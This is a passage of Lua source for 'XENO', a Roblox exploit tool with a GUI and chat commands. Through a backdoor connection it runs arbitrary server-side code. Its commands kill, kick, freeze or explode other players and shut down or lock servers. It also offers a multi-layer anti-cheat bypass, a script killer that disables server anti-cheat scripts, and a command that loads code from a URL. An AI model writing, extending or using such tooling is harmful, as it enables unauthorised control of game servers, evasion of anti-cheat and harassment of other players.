        {"🌫️ Fog","game.Lighting.FogEnd=80",T.Sub},
        {"🔆 Bright","game.Lighting.Brightness=3",T.Warn},
        {"🔒 Lock","game.Players.MaxPlayers=#game.Players:GetPlayers()",T.Warn},
        {"🔓 Unlock","game.Players.MaxPlayers=50",T.OK},
        {"💣 Shutdown",'for _,p in pairs(game.Players:GetPlayers()) do p:Kick("XENO") end',T.Err},
        {"🎵 Stop",'for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Stop();v:Destroy() end end',T.Sub},
    }) do
        actionBtn(lg,sa[1],sa[3],i,function()
            if not BD:isConnected() then Notify("Not connected!",T.Err); return end
            BD:exec(sa[2])
            Notify(sa[1].." done",T.OK)
        end)
    end

    heading(pg,"Physics",3)
    local pc = card(pg,80,4)
    local gi = inputField(pc,"Gravity (196.2)...",1)
    gi.Size=UDim2.new(0.65,0,0,30)
    local gb = actionBtn(pc,"Set Gravity",T.Primary,2,function()
        if not BD:isConnected() then Notify("Not connected!",T.Err); return end
        BD:exec("workspace.Gravity="..(tonumber(gi.Text) or 196.2))
        Notify("Gravity set",T.OK)
    end)
    gb.Position=UDim2.new(0.68,0,0,0)
end

-- ═══════════════════════════════════════════════════
--  14 · ANTI-CHEAT PAGE
-- ═══════════════════════════════════════════════════

do
    local pg = pages["Anti-Cheat"]
    local detectedProfile = AC:detectGame()

    heading(pg,"🛡️ Anti-Cheat Bypass",1)

    local explainCard = card(pg,100,2)
    U.new("TextLabel",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text=table.concat({
        '<font color="#A6E3A1">Server Authority Model — works on Rivals, Arsenal, etc.</font>','',
        '<font color="#F9E2AF">L1:</font> <font color="#9399B2">Kick/Ban prevention hooks</font>',
        '<font color="#F9E2AF">L2:</font> <font color="#9399B2">Server authority stat changes</font>',
        '<font color="#F9E2AF">L3:</font> <font color="#9399B2">Detection→punishment pipeline break</font>',
        '<font color="#F9E2AF">L4:</font> <font color="#9399B2">Game-specific profile bypass</font>',
        '<font color="#F9E2AF">L5:</font> <font color="#9399B2">AC script killer (basic games)</font>',
        '<font color="#F9E2AF">L6:</font> <font color="#9399B2">Continuous flag-clearing loop</font>',
    },"\n"),TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,TextWrapped=true,RichText=true,Parent=explainCard})

    heading(pg,"Game Profile",3)
    local profileCard = card(pg,45,4)

    local gameName = U.getGameName()

    U.new("TextLabel",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
        Text=string.format('<font color="#A6E3A1">Game:</font> <font color="#CDD6F4">%s</font>  <font color="#A6E3A1">Profile:</font> <font color="#F9E2AF">%s</font>\n<font color="#9399B2">%s</font>',
            gameName, detectedProfile.name, detectedProfile.desc),
        TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,TextWrapped=true,RichText=true,Parent=profileCard})

    heading(pg,"Controls",5)
    local controlCard = card(pg,90,6)
    local acResultLabel = U.new("TextLabel",{Size=UDim2.new(1,0,0,40),BackgroundTransparency=1,
        Text='<font color="#9399B2">Status: Inactive — Profile: '..detectedProfile.name..'</font>',
        TextColor3=T.Sub,TextSize=12,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,TextWrapped=true,RichText=true,Parent=controlCard})

    local acBtns = U.new("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,1,-30),BackgroundTransparency=1,Parent=controlCard},{
        U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder}),
    })

    actionBtn(acBtns,"🛡️ Full Bypass",T.OK,1,function()
        acResultLabel.Text='<font color="#F9E2AF">Running 6-layer local bypass...</font>'
        Notify("🛡️ Running bypass for "..detectedProfile.name.."...",T.Warn)
        task.spawn(function()
            local ok,result = AC:execute()
            if ok then
                acResultLabel.Text=string.format('<font color="#A6E3A1">✓ Bypass ACTIVE</font>\n<font color="#9399B2">Profile: %s · %d/6 layers OK</font>',result.profile,result.layersOk)
                Notify("🛡️ Active ["..result.profile.."] — "..result.layersOk.."/6 OK",T.OK,6)
            else
                acResultLabel.Text='<font color="#F3788C">Failed</font>'
                Notify("Failed",T.Err)
            end
        end)
    end)

    actionBtn(acBtns,"🔄 Clear Flags",T.Accent,2,function()
        AC:syncAfterChange()
        Notify("Flags cleared locally",T.OK)
    end)

    actionBtn(acBtns,"💀 Kill Scripts",T.Err,3,function()
        local fn = loadstring(AC.simpleKillCode)
        if fn then pcall(fn) end
        task.wait(0.8)
        local m=RS:FindFirstChild("XENO_SIMPLE_KILL")
        if m then Notify("Killed "..m.Value.." scripts locally",T.OK); pcall(function() m:Destroy() end)
        else Notify("Kill sent via executor",T.Warn) end
    end)

    heading(pg,"Manual Script Killer",7)
    local mkc = card(pg,80,8)
    U.new("TextLabel",{Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,Text="Script name to disable:",TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,Parent=mkc})
    local mki = inputField(mkc,"e.g. AntiCheat",2)
    mki.Size=UDim2.new(0.72,0,0,30)
    mki.Position=UDim2.new(0,0,1,-32)
    local mkb = actionBtn(mkc,"Kill",T.Err,3,function()
        if mki.Text=="" then return end
        local code = string.format([[pcall(function() for _,svc in ipairs({game:GetService("ServerScriptService"),game:GetService("ServerStorage"),game:GetService("Workspace")}) do pcall(function() for _,obj in ipairs(svc:GetDescendants()) do if (obj:IsA("Script") or obj:IsA("ModuleScript")) and (obj.Name=="%s" or obj:GetFullName():find("%s")) then pcall(function() obj.Disabled=true;obj:Destroy() end) end end end) end end)]],mki.Text,mki.Text)
        local fn = loadstring(code)
        if fn then pcall(fn) end
        Notify("Kill sent locally: "..mki.Text,T.OK)
    end)
    mkb.Position=UDim2.new(0.74,4,1,-32)

    heading(pg,"Supported Games",9)
    for idx,profile in ipairs(AC.gameProfiles) do
        if #profile.placeIds > 0 then
            local gc = card(pg,35,9+idx)
            local isActive = (profile.name == detectedProfile.name)
            U.new("TextLabel",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
                Text=(isActive and "▸ " or "  ")..profile.name..(isActive and " ✓" or "").."  —  "..profile.desc,
                TextColor3=isActive and T.OK or T.Text,TextSize=12,
                Font=isActive and Enum.Font.GothamBold or Enum.Font.Gotham,
                TextXAlignment=Enum.TextXAlignment.Left,Parent=gc})
        end
    end
end

-- ═══════════════════════════════════════════════════
--  15 · COMMAND REGISTRY
-- ═══════════════════════════════════════════════════

local Commands = {}

local function reg(n,a,u,f)
    local e={name=n,aliases=a or {},usage=u or "",fn=f}
    Commands[n:lower()]=e
    for _,al in ipairs(a) do Commands[al:lower()]=e end
end

local function ssRun(c)
    if not BD:isConnected() then
        Notify("Not connected!",T.Err)
        addHistory("✗ Not connected","#F3788C")
        return false
    end
    local ok,err=BD:exec(c)
    if not ok then addHistory("✗ "..tostring(err),"#F3788C") end
    return ok
end

local function pRef(n) return string.format('game.Players["%s"]',n) end

-- Player commands
reg("kill",{"slay"},";kill <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..".Character:BreakJoints() end)"); addHistory("→ kill "..p.Name,"#F3788C") end end)
reg("kick",{"boot"},";kick <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun(pRef(p.Name)..':Kick("XENO")'); addHistory("→ kick "..p.Name,"#F3788C") end end)
reg("god",{},";god <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do local h=pRef(p.Name)..'.Character:FindFirstChildWhichIsA("Humanoid")'; ssRun("pcall(function() "..h..".MaxHealth=math.huge;"..h..".Health=math.huge end)"); if AC.active then task.delay(0.3,function() AC:syncAfterChange() end) end; addHistory("→ god "..p.Name,"#A6E3A1") end end)
reg("speed",{"ws"},";speed <plr> <n>",function(a) local v=tonumber(a[2]) or 100; for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..'.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed='..v.." end)"); if AC.active then task.delay(0.3,function() AC:syncAfterChange() end) end; addHistory("→ speed "..p.Name.."="..v,"#B4A0FF") end end)
reg("jumppower",{"jp"},";jp <plr> <n>",function(a) local v=tonumber(a[2]) or 100; for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() local h="..pRef(p.Name)..'.Character:FindFirstChildWhichIsA("Humanoid");h.UseJumpPower=true;h.JumpPower='..v.." end)"); if AC.active then task.delay(0.3,function() AC:syncAfterChange() end) end; addHistory("→ jp "..p.Name.."="..v,"#B4A0FF") end end)
reg("freeze",{"fr"},";freeze <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..".Character.HumanoidRootPart.Anchored=true end)"); addHistory("→ freeze "..p.Name,"#89B4FA") end end)
reg("thaw",{},";thaw <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..".Character.HumanoidRootPart.Anchored=false end)"); addHistory("→ thaw "..p.Name,"#F9E2AF") end end)
reg("tp",{},";tp <p1> <p2>",function(a) local f=U.findPlayers(a[1]); local t=U.findPlayers(a[2] or "me"); if #f==0 or #t==0 then return end; for _,p in ipairs(f) do ssRun("pcall(function() "..pRef(p.Name)..".Character.HumanoidRootPart.CFrame="..pRef(t[1].Name)..".Character.HumanoidRootPart.CFrame end)"); addHistory("→ tp "..p.Name.."→"..t[1].Name,"#B4A0FF") end end)
reg("ff",{},";ff <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun('Instance.new("ForceField",'..pRef(p.Name)..'.Character)'); addHistory("→ ff "..p.Name,"#A6E3A1") end end)
reg("unff",{},";unff <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun('pcall(function() for _,v in pairs('..pRef(p.Name)..'.Character:GetChildren()) do if v:IsA("ForceField") then v:Destroy() end end end)'); addHistory("→ unff "..p.Name,"#F3788C") end end)
reg("explode",{},";explode <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() Instance.new('Explosion',workspace).Position="..pRef(p.Name)..".Character.HumanoidRootPart.Position end)"); addHistory("→ explode "..p.Name,"#F3788C") end end)
reg("fire",{},";fire <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() Instance.new('Fire',"..pRef(p.Name)..".Character.HumanoidRootPart) end)"); addHistory("→ fire "..p.Name,"#F9E2AF") end end)
reg("sparkles",{},";sparkles <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() Instance.new('Sparkles',"..pRef(p.Name)..".Character.HumanoidRootPart) end)"); addHistory("→ sparkles "..p.Name,"#B4A0FF") end end)
reg("invisible",{"invis"},";invis <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() for _,v in pairs("..pRef(p.Name)..".Character:GetDescendants()) do if v:IsA('BasePart') then v.Transparency=1 end end end)"); addHistory("→ invis "..p.Name,"#9399B2") end end)
reg("visible",{"vis"},";vis <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() for _,v in pairs("..pRef(p.Name)..".Character:GetDescendants()) do if v:IsA('BasePart') and v.Name~='HumanoidRootPart' then v.Transparency=0 end end end)"); addHistory("→ visible "..p.Name,"#CDD6F4") end end)
reg("sit",{},";sit <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..'.Character:FindFirstChildWhichIsA("Humanoid").Sit=true end)'); addHistory("→ sit "..p.Name,"#9399B2") end end)

-- Server commands
reg("time",{},";time <n>",function(a) ssRun("game.Lighting.ClockTime="..(tonumber(a[1]) or 14)); addHistory("→ time","#F9E2AF") end)
reg("fog",{},";fog <n>",function(a) ssRun("game.Lighting.FogEnd="..(tonumber(a[1]) or 100000)); addHistory("→ fog","#9399B2") end)
reg("gravity",{"grav"},";gravity <n>",function(a) ssRun("workspace.Gravity="..(tonumber(a[1]) or 196.2)); addHistory("→ gravity","#B4A0FF") end)
reg("music",{},";music <id>",function(a) ssRun('local s=Instance.new("Sound",workspace);s.SoundId="rbxassetid://'..(tonumber(a[1]) or 0)..'";s.Volume=1;s.Looped=true;s:Play()'); addHistory("→ music","#B4A0FF") end)
reg("stopmusic",{},";stopmusic",function() ssRun('for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Stop();v:Destroy() end end'); addHistory("→ stopped","#9399B2") end)
reg("message",{"msg"},";msg <text>",function(a) ssRun('local m=Instance.new("Message",workspace);m.Text="'..table.concat(a," ")..'";game:GetService("Debris"):AddItem(m,5)'); addHistory("→ msg","#B4A0FF") end)
reg("hint",{},";hint <text>",function(a) ssRun('local h=Instance.new("Hint",workspace);h.Text="'..table.concat(a," ")..'";game:GetService("Debris"):AddItem(h,5)'); addHistory("→ hint","#B4A0FF") end)
reg("shutdown",{"sd"},";shutdown",function() ssRun('for _,p in pairs(game.Players:GetPlayers()) do p:Kick("XENO") end'); addHistory("→ SHUTDOWN","#F3788C") end)
reg("lockserver",{"lock"},";lock",function() ssRun("game.Players.MaxPlayers=#game.Players:GetPlayers()"); addHistory("→ locked","#F9E2AF") end)
reg("unlockserver",{"unlock"},";unlock",function() ssRun("game.Players.MaxPlayers=50"); addHistory("→ unlocked","#A6E3A1") end)

-- AC commands
reg("bypass",{"acbypass"},";bypass",function()
    addHistory("→ Running local bypass...","#F9E2AF")
    task.spawn(function()
        local ok,result = AC:execute()
        if ok then
            addHistory("✓ Bypass active ["..result.profile.."] "..result.layersOk.."/6","#A6E3A1")
        else
            addHistory("✗ Failed","#F3788C")
        end
    end)
end)

reg("acstatus",{},";acstatus",function()
    addHistory(AC.active and "✓ AC: ACTIVE (Local)" or "✗ AC: inactive — ;bypass","#9399B2")
end)

reg("clearflags",{"sync"},";clearflags",function()
    AC:syncAfterChange()
    addHistory("→ Flags cleared locally","#A6E3A1")
end)

-- Utility
reg("require",{"req"},";require <id>",function(a) local id=tonumber(a[1]); if not id then return end; BD:requireModule(id); addHistory("→ require("..id..")","#B4A0FF") end)
reg("loadurl",{"url"},";loadurl <url>",function(a) if not a[1] then return end; BD:loadUrl(a[1]); addHistory("→ loadurl","#B4A0FF") end)
reg("exec",{"execute","run"},";exec <code>",function(a) ssRun(table.concat(a," ")); addHistory("→ exec","#A6E3A1") end)
reg("clear",{"cls"},";clear",function() cmdHistory={}; addHistory("Cleared","#9399B2") end)
reg("status",{},";status",function()
    if BD:isConnected() then
        addHistory("✓ "..BD.active.name.." ["..BD.active.fingerprint.."]","#A6E3A1")
        addHistory("  "..BD.active.patternName,"#9399B2")
    else
        addHistory("✗ Not connected","#F3788C")
    end
    addHistory("  AC: "..(AC.active and "ACTIVE" or "inactive"),"#9399B2")
end)
reg("cmds",{"help"},";cmds",function()
    local listed={}
    for _,e in pairs(Commands) do
        if not listed[e] then addHistory(e.usage,"#B4A0FF"); listed[e]=true end
    end
end)

-- Input handler
cmdInput.FocusLost:Connect(function(enter)
    if not enter then return end
    local raw=cmdInput.Text
    cmdInput.Text=""
    if raw:sub(1,#CFG.Prefix)~=CFG.Prefix then return end
    local parts={}
    for w in raw:sub(#CFG.Prefix+1):gmatch("%S+") do parts[#parts+1]=w end
    if #parts==0 then return end
    local cn=table.remove(parts,1):lower()
    local entry=Commands[cn]
    if entry then
        addHistory(CFG.Prefix..cn.." "..table.concat(parts," "),"#8A2BE2")
        local ok,err=pcall(entry.fn,parts)
        if not ok then addHistory("✗ "..tostring(err),"#F3788C") end
    else
        addHistory("✗ Unknown: "..cn,"#F3788C")
        Notify("Unknown: "..cn,T.Err)
    end
end)

LP.Chatted:Connect(function(msg)
    if msg:sub(1,#CFG.Prefix)~=CFG.Prefix then return end
    local parts={}
    for w in msg:sub(#CFG.Prefix+1):gmatch("%S+") do parts[#parts+1]=w end
    if #parts==0 then return end
    local cn=table.remove(parts,1):lower()
    local entry=Commands[cn]
    if entry then pcall(entry.fn,parts) end
end)

-- ═══════════════════════════════════════════════════
--  16 · KEYBIND
-- ═══════════════════════════════════════════════════

UIS.InputBegan:Connect(function(input,processed)
    if processed then return end
    if input.KeyCode==CFG.ToggleKey then
        main.Visible = not main.Visible
        if main.Visible then
            main.Size=UDim2.new(0,0,0,0)
            U.tween(main,{Size=UDim2.new(0,W.Width,0,W.Height)},0.4,Enum.EasingStyle.Back)
        end
    end
end)

-- ═══════════════════════════════════════════════════
--  17 · BOOT
-- ═══════════════════════════════════════════════════

do
    main.Size=UDim2.new(0,0,0,0)
    main.BackgroundTransparency=1

    task.wait(0.15)
    U.tween(main,{Size=UDim2.new(0,W.Width,0,W.Height),BackgroundTransparency=0},0.55,Enum.EasingStyle.Back)
    task.wait(0.6)
    switchTab("Dashboard")

    local profile = AC:detectGame()
    Notify("⚡ XENO v"..CFG.Version.." loaded",T.Primary)
    Notify("🛡️ AC: "..profile.name.." — 6-layer bypass ready",T.OK)
    Notify(#BD.patterns.." patterns · "..#BD.fingerprints.." fingerprints",T.Accent)

    setStatus("Ready",T.Sub)
    statusValLbl.Text="Ready"
    statusValLbl.TextColor3=T.Sub

    print(string.format([[
    ═══════════════════════════════════════
     ⚡ XENO v%s — Xeno Executor Build
     AC Profile: %s
     Patterns: %d · Fingerprints: %d
     Toggle: RightShift | Prefix: %s
    ═══════════════════════════════════════
    ]],CFG.Version,profile.name,#BD.patterns,#BD.fingerprints,CFG.Prefix))
end
